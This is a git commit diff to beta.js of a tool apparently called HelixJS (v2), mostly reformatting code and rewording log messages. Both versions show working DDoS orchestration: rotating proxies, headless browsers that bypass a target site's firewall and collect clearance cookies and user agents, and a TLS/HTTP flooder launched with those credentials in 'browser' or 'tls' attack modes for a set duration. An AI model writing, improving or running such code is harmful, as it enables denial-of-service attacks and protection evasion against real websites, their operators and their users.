146b4f81ebdd2ea13175ebc55f797c7b35506dd7
Catto <nek0f3mboy@gmail.com>
2022-04-19 23:51:59 +0200

    ✏️ Edited messages in beta.js

--- beta.js
+++ beta.js
@@ -79,20 +79,20 @@ let connections = CustomsARGVS.conn;
 let ListIDS = [];
 let Idbrw = 0;
 let idsRunned = [];
-if(CustomsARGVS.postdata){
-  if(CustomsARGVS.postdata.includes("~")){
+if (CustomsARGVS.postdata) {
+  if (CustomsARGVS.postdata.includes("~")) {
     CustomsARGVS.postdata = CustomsARGVS.postdata.replace(/~/g, "&");
   }
-  if(CustomsARGVS.postdata.includes("*")){
+  if (CustomsARGVS.postdata.includes("*")) {
     CustomsARGVS.postdata = CustomsARGVS.postdata.replace(/\*/g, "%");
   }
 }
-if(CustomsARGVS.customCookie){
-  if(CustomsARGVS.customCookie.includes("~")){
+if (CustomsARGVS.customCookie) {
+  if (CustomsARGVS.customCookie.includes("~")) {
     CustomsARGVS.customCookie = CustomsARGVS.customCookie.replace(/~/g, ";");
   }
 }
-if(target.includes("*")){
+if (target.includes("*")) {
   target = target.replace(/\*/g, "%");
 }
 
@@ -126,8 +126,8 @@ function log(string) {
   console.log(`[${hours}:${minutes}:${seconds}] ${string}`);
 }
 
-log(`HelixJS (v2)` + `[ ${PROMOTION} ]`.cyan);
-log(`Loading proxies..`.yellow);
+log(`HelixJS (v2) ` + `[ ${PROMOTION} ]`);
+log(`Loading proxies..`);
 
 try {
   if (PROXYURL.indexOf("//") & PROXYURL.indexOf(".")) {
@@ -144,183 +144,184 @@ try {
   ProxyFILE = fs.readFileSync("proxy.txt").toString().match(/\S+/g);
 }
 const proxies_total = ProxyFILE.length - 2;
-  //const ProxyFILE = set.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);
-  log(`${proxies_total + 2} proxies loaded`.green);
+//const ProxyFILE = set.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);
+log(`Loaded ${proxies_total + 2}`);
 
-  function ProxyGenerate() {
-    return (proxy_obje = ProxyFILE[~~[Math.random() * proxies_total]]);
-  }
+function ProxyGenerate() {
+  return (proxy_obje = ProxyFILE[~~[Math.random() * proxies_total]]);
+}
 
-  function brow_tokens(strings, proxy_co, ua_received) {
-    if (
-      browser_saves == null &&
-      browser_saves == undefined &&
-      browser_saves == ""
-    ) {
-      browser_saves +=
-        "" + proxy_co + "#" + strings + "#" + ua_received + "" + ":::";
-    } else {
-      browser_saves +=
-        "" + proxy_co + "#" + strings + "#" + ua_received + "" + ":::";
-    }
-  }
-
-  var launch_browser = async function launch_browser(Extra = {}) {
-    Idbrw++;
-    let RunSessions = require("./browser/browserEngine.js");
-    let IdBrowser = Extra.IdBrowser;
-    const Proxy = Extra.Proxy;
-    const intentNum = Extra.intentNum;
-    const ProxyReopen = ProxyGenerate();
-
-    const resposense = await RunSessions.RunSessions({
-      IdBrowser: IdBrowser,
-      Proxy: Proxy,
-      Domain: VarsDefinetions.Objetive,
-    });
-
-    if (resposense == undefined) {
-      log("[error] [" + IdBrowser + "]" + ` Unable to Bypass  with ip: ${Proxy}`.red);
-      // launch_browser({
-      //   IdBrowser: IdBrowser,
-      //   Proxy: ProxyReopen,
-      //   intentNum: intentNum + 1,
-      // });
-      ListIDS.push(IdBrowser);
-      return;
-    } else if (resposense == "bad") {
-      log("[error] [" + IdBrowser + "]" + ` Unable to Bypass  with ip: ${Proxy}`.red);
-      // launch_browser({
-      //   IdBrowser: IdBrowser,
-      //   Proxy: ProxyReopen,
-      //   intentNum: intentNum + 1,
-      // });
-      ListIDS.push(IdBrowser);
-       return;
-    } else {
-      if (typeAlert == 1) {
-        log(`Browsers received (${browser_saves.split("#").length})`);
-      } else if (typeAlert == 2) {
-        log(
-          `[info]` + ` Firewall bypassed with ip: ${Proxy} | Cookies: ${resposense[IdBrowser].split(":::")[0]}`.cyan );
-      } else {
-        log("Invalid alert type.");
-        return process.exit();
-      }
-
-      await setFlooder(Proxy,resposense[IdBrowser].split(":::")[0],resposense[IdBrowser].split(":::")[1])
-    //   brow_tokens(
-    //     //revisar
-    //     resposense[IdBrowser].split(":::")[0],
-    //     Proxy,
-    //     resposense[IdBrowser].split(":::")[1]
-    //   );
-
-      ListIDS.push(IdBrowser);
-      //agrega el id al array
-    }
-  };
-
-  if (ModeATTACK == "browser") {
-    log(`Mode: `.yellow+`${ModeATTACK.toUpperCase()}`);
-    log(`Total browsers to open: `.yellow + `${length_browsers}`);
-    log(`method: `.yellow+`${VarsDefinetions.Method_raw}`);
-    log(`postdata: `.yellow+`${CustomsARGVS.postdata || 'false'}`);
-    log(`cookie: `.yellow+`${CustomsARGVS.customCookie || 'false'}`);
-    log(`referer: `.yellow+`${CustomsARGVS.referer || 'false'}`);
-    log(`Launching browsers on: `.yellow+`${target}`);
-    let NumOPenBrowser = 10;
-    var myInterval = setInterval(function () {
-      //idsRunned: lista de ids ya lanzados
-      if (ListIDS.length >= length_browsers) {
-        //KillBrowsers();
-        clearInterval(myInterval);
-        log(`[success]`+` Attcak proccess finished, idle set.`);
-      } else if (ListIDS.length == idsRunned.length) {
-        for (let j = 0; j < NumOPenBrowser; j++) { 
-          const Proxy = ProxyGenerate();
-          idsRunned.push(Idbrw);
-          launch_browser({ IdBrowser: Idbrw, Proxy: Proxy, intentNum: 0 });
-        }
-
-         log(`[info] Starting interval`);
-      } else if (
-        ListIDS.length == length_browsers && ListIDS.length < (50 / 100) * length_browsers) {
-        log(`[success] Cookies recolected!`);
-      }
-    }, 0);
-  } else if (ModeATTACK == "tls") {
-    log(`[info] Mode: ${ModeATTACK}`);
-    log(`Target: ${target}`);
-    require("./browser/flooder").TLSHTTP(
-      (option = {
-        target: VarsDefinetions.Objetive,
-        host: host,
-        RequestIP: VarsDefinetions.req_ip,
-        proxies: ProxyFILE,
-      })
-    );
-    log(`[info] Flooder started`);
+function brow_tokens(strings, proxy_co, ua_received) {
+  if (
+    browser_saves == null &&
+    browser_saves == undefined &&
+    browser_saves == ""
+  ) {
+    browser_saves +=
+      "" + proxy_co + "#" + strings + "#" + ua_received + "" + ":::";
   } else {
-    console.clear();
-    log('Invalid mode selected, try "browser or tls"');
-    process.exit();
+    browser_saves +=
+      "" + proxy_co + "#" + strings + "#" + ua_received + "" + ":::";
   }
+}
 
-  function setFlooder(ip,cookie,ua) {
-    //clearInterval(myInterval);
+var launch_browser = async function launch_browser(Extra = {}) {
+  Idbrw++;
+  let RunSessions = require("./browser/browserEngine.js");
+  let IdBrowser = Extra.IdBrowser;
+  const Proxy = Extra.Proxy;
+  const intentNum = Extra.intentNum;
+  const ProxyReopen = ProxyGenerate();
 
-    if(CustomsARGVS.postdata){
-      PostaMOD = encodeURI(CustomsARGVS.postdata);
-    }
+  const resposense = await RunSessions.RunSessions({
+    IdBrowser: IdBrowser,
+    Proxy: Proxy,
+    Domain: VarsDefinetions.Objetive,
+  });
 
-    try {
-      if (
-        (CustomsARGVS.referer.includes("//") == true) &
-          (CustomsARGVS.referer.includes(".") == true) &&
-        CustomsARGVS.referer.includes("//") == true
-      ) {
-        rff = CustomsARGVS.referer;
-      }
-    } catch (error) {
-      rff = target;
-    }
-
-    try {
-      if (
-        (CustomsARGVS.customCookie.includes("=") == true)
-      ) {
-        cookie_CTM = ";" + CustomsARGVS.customCookie;
-      }
-    } catch (error) {
-      cookie_CTM = ""; //null
-    }
-
-    require("./browser/flooder.js").flooderTLS(
-      (option = {
-        //DATABROWSER: browser_saves,
-          ip: ip,
-          cookie: cookie,
-          ua: ua,
-          host: host,
-          rff: rff,
-          target: VarsDefinetions.Objetive,
-          RequestIP: VarsDefinetions.req_ip,
-          userAgent: user_agent,
-          addcookie: cookie_CTM,
-          TimeATTACK: VarsDefinetions.time,
-          METHOD: VarsDefinetions.Method_raw,
-          PostData: PostaMOD || undefined,
-          connections: connections || 32,
-      })
+  if (resposense == undefined) {
+    log(
+      "[error] [" +
+        IdBrowser +
+        "]" +
+        ` Unknown error occured while trying to bypass firewall with ip: ${Proxy}`
+          
     );
+    ListIDS.push(IdBrowser);
+    return;
+  } else if (resposense == "bad") {
+    log(
+      "[error] [" +
+        IdBrowser +
+        "]" +
+        ` Error while trying to bypass firewall with ip: ${Proxy}`
+    );
+    ListIDS.push(IdBrowser);
+    return;
+  } else {
+    if (typeAlert == 1) {
+      log(`Browsers received (${browser_saves.split("#").length})`);
+    } else if (typeAlert == 2) {
+      log(
+        `[info]` +
+          ` Successfully bypassed firewall with ip: ${Proxy} | Cookies: ${
+            resposense[IdBrowser].split(":::")[0]
+          }`
+      );
+    } else {
+      log("Invalid alert type.");
+      return process.exit();
+    }
 
-    //log(`[info] Flooder started with ${(browser_saves.split("#").length - 1) / 2} tokens`.yellow);
-    log(`[info]`+` Flooder started with ${ip}`.yellow);
+    await setFlooder(
+      Proxy,
+      resposense[IdBrowser].split(":::")[0],
+      resposense[IdBrowser].split(":::")[1]
+    );
+    ListIDS.push(IdBrowser);
+  }
+};
+
+if (ModeATTACK == "browser") {
+  log(`Mode: ` + `${ModeATTACK.toUpperCase()}`);
+  log(`Total browsers to open: ` + `${length_browsers}`);
+  log(`method: ` + `${VarsDefinetions.Method_raw}`);
+  log(`postdata: ` + `${CustomsARGVS.postdata || "false"}`);
+  log(`cookie: ` + `${CustomsARGVS.customCookie || "false"}`);
+  log(`referer: ` + `${CustomsARGVS.referer || "false"}`);
+  log(`Launching browsers on: ` + `${target}`);
+  let NumOPenBrowser = 10;
+  var myInterval = setInterval(function () {
+    //idsRunned: lista de ids ya lanzados
+    if (ListIDS.length >= length_browsers) {
+      //KillBrowsers();
+      clearInterval(myInterval);
+      log(`[success]` + ` Attcak proccess finished, idle set.`);
+    } else if (ListIDS.length == idsRunned.length) {
+      for (let j = 0; j < NumOPenBrowser; j++) {
+        const Proxy = ProxyGenerate();
+        idsRunned.push(Idbrw);
+        launch_browser({ IdBrowser: Idbrw, Proxy: Proxy, intentNum: 0 });
+      }
+
+      log(`[info] Starting interval`);
+    } else if (
+      ListIDS.length == length_browsers &&
+      ListIDS.length < (50 / 100) * length_browsers
+    ) {
+      log(`[success] Cookies recolected!`);
+    }
+  }, 0);
+} else if (ModeATTACK == "tls") {
+  log(`[info] Mode: ${ModeATTACK}`);
+  log(`Target: ${target}`);
+  require("./browser/flooder").TLSHTTP(
+    (option = {
+      target: VarsDefinetions.Objetive,
+      host: host,
+      RequestIP: VarsDefinetions.req_ip,
+      proxies: ProxyFILE,
+    })
+  );
+  log(`[info] Flooder started`);
+} else {
+  console.clear();
+  log('Invalid mode selected, valid modes: tls, browser');
+  process.exit();
+}
+
+function setFlooder(ip, cookie, ua) {
+  //clearInterval(myInterval);
+
+  if (CustomsARGVS.postdata) {
+    PostaMOD = encodeURI(CustomsARGVS.postdata);
   }
 
-  setTimeout(() => {
-    console.clear();
-    log(`Attacks Finished.`);
-    process.exit(1);
-  }, VarsDefinetions.time * 1000);
+  try {
+    if (
+      (CustomsARGVS.referer.includes("//") == true) &
+        (CustomsARGVS.referer.includes(".") == true) &&
+      CustomsARGVS.referer.includes("//") == true
+    ) {
+      rff = CustomsARGVS.referer;
+    }
+  } catch (error) {
+    rff = target;
+  }
+
+  try {
+    if (CustomsARGVS.customCookie.includes("=") == true) {
+      cookie_CTM = ";" + CustomsARGVS.customCookie;
+    }
+  } catch (error) {
+    cookie_CTM = ""; //null
+  }
+
+  require("./browser/flooder.js").flooderTLS(
+    (option = {
+      //DATABROWSER: browser_saves,
+      ip: ip,
+      cookie: cookie,
+      ua: ua,
+      host: host,
+      rff: rff,
+      target: VarsDefinetions.Objetive,
+      RequestIP: VarsDefinetions.req_ip,
+      userAgent: user_agent,
+      addcookie: cookie_CTM,
+      TimeATTACK: VarsDefinetions.time,
+      METHOD: VarsDefinetions.Method_raw,
+      PostData: PostaMOD || undefined,
+      connections: connections || 32,
+    })
+  );
+
+  //log(`[info] Flooder started with ${(browser_saves.split("#").length - 1) / 2} tokens`);
+  log(`[info]` + ` Flooder started with ${ip}`);
+}
+
+setTimeout(() => {
+  console.clear();
+  log(`Attacks Finished.`);
+  process.exit(1);
+}, VarsDefinetions.time * 1000);
